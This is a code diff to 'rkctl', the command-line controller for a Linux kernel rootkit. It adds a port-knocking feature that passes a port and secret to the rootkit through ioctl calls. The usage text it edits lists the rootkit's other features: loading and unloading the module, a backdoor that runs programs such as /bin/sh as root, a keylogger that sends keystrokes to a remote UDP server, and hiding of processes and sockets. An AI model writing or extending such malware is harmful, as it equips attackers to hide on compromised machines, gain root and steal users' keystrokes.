@@ -213,19 +213,56 @@ int do_socket_hiding(unsigned int request, int argc, const char *argv[]) {
 
 }
 
+int do_port_knocking(unsigned int request, int argc, const char *argv[]) {
+
+    struct hidden_port pk;
+    char *endptr = NULL;
+
+    // check parameters
+    if (request == RKCTL_HIDE_PORT && argc != 4 || request == RKCTL_UNHIDE_PORT && argc != 3) {
+        printf("[-] rkctl: do_port_knocking() invalid number of arguments\n");
+        return -1;
+    }
+
+    // in both cases we expect a port as first argument
+    errno = 0;
+    pk.port = (unsigned short) strtol(argv[2], &endptr, 0);
+
+    if (errno != 0 || *endptr != 0) {
+        printf("[-] rkctl: do_port_knocking() cannot parse port\n");
+        return -1;
+    }
+
+    if (request == RKCTL_HIDE_PORT) {
+
+        // get secret
+        memset(pk.secret, 0, sizeof(pk.secret));
+        memcpy(pk.secret, argv[3], sizeof(pk.secret) - 1);
+
+        return do_ioctl_request("port_knocking_add", request, (void *) &pk);
+
+    } else {
+
+        return do_ioctl_request("port_knocking_rm", request, (void *) pk.port);
+
+    }
+}
+
 void print_usage(void) {
     printf("Usage:\n"
-           "\t ./rkctl help\t\t\t\tShow this help menu.\n"
-           "\t ./rkctl ping\t\t\t\tCheck if the rootkit is alive\n"
-           "\t ./rkctl load <module.ko>\t\tLoad the rootkit (requires root)\n"
-           "\t ./rkctl unload\t\t\t\tUnload the rootkit\n"
-           "\t ./rkctl backdoor <program>\t\tRun an arbitrary program (e.g. /bin/sh) as root\n"
-           "\t ./rkctl keylog_start <ip> <port>\tStart a keylogger that sends to a UDP server at <ip>:<port>\n"
-           "\t ./rkctl keylog_stop\t\t\tStop the current keylogger\n"
-           "\t ./rkctl hidepid_add <pid>\t\tHide a process and all its children by pid\n"
-           "\t ./rkctl hidepid_rm <pid>\t\tUnhide a process and all its non-hidden children by pid\n"
-           "\t ./rkctl hide_socket <port>\t\tHide a socket by its port\n"
-           "\t ./rkctl unhide_socket <port>\t\tUnhide a socket by its port\n\n");
+           "\t ./rkctl help\t\t\t\t\tShow this help menu.\n"
+           "\t ./rkctl ping\t\t\t\t\tCheck if the rootkit is alive\n"
+           "\t ./rkctl load <module.ko>\t\t\tLoad the rootkit (requires root)\n"
+           "\t ./rkctl unload\t\t\t\t\tUnload the rootkit\n"
+           "\t ./rkctl backdoor <program>\t\t\tRun an arbitrary program (e.g. /bin/sh) as root\n"
+           "\t ./rkctl keylog_start <ip> <port>\t\tStart a keylogger that sends to a UDP server at <ip>:<port>\n"
+           "\t ./rkctl keylog_stop\t\t\t\tStop the current keylogger\n"
+           "\t ./rkctl hidepid_add <pid>\t\t\tHide a process and all its children by pid\n"
+           "\t ./rkctl hidepid_rm <pid>\t\t\tUnhide a process and all its non-hidden children by pid\n"
+           "\t ./rkctl hide_socket <port>\t\t\tHide a socket by its port\n"
+           "\t ./rkctl unhide_socket <port>\t\t\tUnhide a socket by its port\n"
+           "\t ./rkctl port_knocking_add <port> <secret>\tProtect port by port knocking with secret\n"
+           "\t ./rkctl port_knocking_rm <port>\t\tRemove port from port knocking list\n\n");
 }
 
 int main(int argc, const char *argv[]) {
@@ -284,6 +321,14 @@ int main(int argc, const char *argv[]) {
     } else if (!strcmp(cmd, "unhide_socket")) {
 
         return do_socket_hiding(RKCTL_UNHIDE_SOCKET, argc, argv);
+
+    } else if (!strcmp(cmd, "port_knocking_add")) {
+
+        return do_port_knocking(RKCTL_HIDE_PORT, argc, argv);
+
+    } else if (!strcmp(cmd, "port_knocking_rm")) {
+
+        return do_port_knocking(RKCTL_UNHIDE_PORT, argc, argv);
 
     } else {
         printf("[-] rkctl: command not supported\n");
